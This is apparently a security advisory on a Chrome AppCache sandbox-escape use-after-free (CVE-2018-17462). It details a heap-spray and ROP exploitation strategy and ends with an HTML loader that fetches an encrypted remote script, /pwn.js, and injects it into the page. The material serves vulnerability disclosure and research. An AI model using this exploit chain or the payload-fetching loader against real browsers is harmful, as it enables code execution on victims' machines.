**Vulnerability Summary**<br>
The vulnerability exists in the AppCache subsystem in Chrome Versions 69.0 and before. This code is located in the privileged browser process outside of the sandbox. The renderer interacts with this subsystem by sending IPC messages from the renderer to the browser process. These messages can cause the browser to make network requests, which are also attacker-controlled and influence the behavior of the code.

**Vendor Response**<br>
Vendor has fixed the issue in Google Chrome version 70.

**CVE**<br>
CVE-2018-17462

**Credit**<br>
Independent security researchers, Ned Williamson and Niklas Baumstark, had reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
Google Chrome Versions 69.0 and before.

**Vulnerability Details**<br>
The vulnerability exists in the AppCache subsystem in Chrome. The buggy code is accessible with IPC messages from the renderer process to the broker process.AppCache is a reference-counted object. It is possible to trigger the RemoveCache function while the object is being destructed, thus incrementing the reference-count of freed object by N.

<img src="https://blogs.securiteam.com/wp-content/uploads/2018/10/Chrome-Sandbox-escape-Removecache-root-cause-analysis.png"><br>

Notice that `newest_complete_cache` is the destructed object. A fix is possible by calling CancelUpdate after setting the `newest_complete_cache` to be NULL.
Further exploiting is achieved by decrementing an object reference-count to 0. Once a reference is taken to the object and being destroyed, the reference-count would reach 0 and the object would be freed, thus creating a stronger use-after-free. (should be called type confusion?)

**Exploit**<br>
This bug provides us two essential primitives: use-after-free decrement-by-N of the first dword of the freed object, where N is controlled. If in the process of decrementing, the first dword reaches 0, the AppCache destructor is called and the pointer is freed.
We use these primitives in two stages: first, to construct a leak, and second, to trigger code execution. The freed AppCache object has size 0xA0 bytes. We found that net::CanonicalCookie has the same size, so we can spray cookies in the browser process by making a network request and including cookies in the response.
std::string name is the first object in the CanonicalCookie. This name is the key from the key/value pair name=value from the cookie string. On Windows STL, the first qword of a std::string object is a pointer to the string data. By using decrement-by-N, we leak a number of bytes by reading the cookie back from the browser and scanning the name field. This leak gives us a heap address, which allows us to spray the heap and predictably place controlled data at a now-known address.
To achieve code execution, we produce a single dangling reference to a freed AppCache via the described vulnerability. We reclaim it with a blob of the same size, forging a reference count of 1 and a fake AppCacheGroup with reference count 0. Once we remove the dangling reference and enter the AppCache destructor, the else branch of the RemoveCache method will cause the AppCacheGroup to be freed due to its reference count going from 0 to 1 and back to 0.

```c++
void AppCacheGroup::RemoveCache(AppCache* cache) {
  DCHECK(cache->associated_hosts().empty());
  if (cache == newest_complete_cache_) {
    // ...
  } else {
    scoped_refptr<AppCacheGroup> protect(this);
    // ...
  }
}
```

The AppCacheGroup destructor in turn performs a virtual call, which
we fully control.

```c++
AppCacheGroup::~AppCacheGroup() {
  // ...
  if (update_job_)
    delete update_job_; // <- code execution here
}
```
Due to the once-per-boot ASLR approach of Windows, all modules are loaded
at the same address in the renderer and broker process. We use a gadget
from __longjmp_internal to bootstrap the ROP. From there we can either
jump to shellcode or open notepad.

```html
<head>
<title>owning, please wait...</title>
<style>
body{background:white;font-size:0.8em;}
document{background:white;}
</style>
</head>
<pre id="progress"></pre>
<pre id="progress-rce"></pre>
<pre id="progress-infoleak"></pre>
<pre id="progress-rip"></pre>
<script src="crypto/BigInteger.js"></script>
<script src="crypto/aes.js"></script>
<script>
print = alert;
var g = bigInt("115740200527109164239523414760926155534485715860090261532154107313946218459149402375178179458041461723723231563839316251515439564315555249353831328479173170684416728715378198172203100328308536292821245983596065287318698169565702979765910089654821728828592422299160041156491980943427556153020487552135890973413");
var p = bigInt("124325339146889384540494091085456630009856882741872806181731279018491820800119460022367403769795008250021191767583423221479185609066059226301250167164084041279837566626881119772675984258163062926954046545485368458404445166682380071370274810671501916789361956272226105723317679562001235501455748016154805420913");
var bits = 1024;
var algo = {
    'name': 'AES-CBC',
    'iv': new Uint8Array(16),
};
function rand(bits) {
    var a = new Uint8Array(Math.ceil(bits / 8));
    window.crypto.getRandomValues(a);
    var digits = [];
    a.forEach((x) => digits.push(bigInt(x)));
    return bigInt.fromArray(digits, 256, false);
}
async function aesDecrypt(s, cipher) {
    var bytes = new Uint8Array(s.toArray(256).value
        .map((x) => 0^x.toString()).slice(0, 16));
    if (typeof crypto.subtle !== 'undefined') {
        var key = await window.crypto.subtle.importKey(
            'raw', bytes, algo, false, ['decrypt', 'encrypt']);
        var plain = await window.crypto.subtle.decrypt(algo, key, cipher);
    } else {
        var aes = new aesjs.ModeOfOperation.cbc(bytes, algo.iv);
        var plain = aes.decrypt(cipher);
        var padLen = plain[plain.length - 1];
        plain = plain.slice(0, plain.length - padLen);
    }
    return plain;
}
async function fetchDH(url, ascii = true) {
    var a = rand(bits);
    var A = g.modPow(a, p);
    var res = await (await fetch(url + '?x=' + A.toString())).json();
    var B = bigInt(res.B);
    var s = B.modPow(a, p);
    var cipher = new Uint8Array(res.result);
    var buf = await aesDecrypt(s, cipher);
    if (ascii)
        return String.fromCharCode.apply(null, new Uint8Array(buf));
    else
        return buf;
}
async function go_enc() {
    var js = await fetchDH('/pwn.js');
    var el = document.createElement('script');
    el.innerHTML = js;
    document.body.appendChild(el);
}
async function go_plain() {
    var el = document.createElement('script');
    el.setAttribute('src', '/pwn.js');
    document.body.appendChild(el);
}
</script>
```
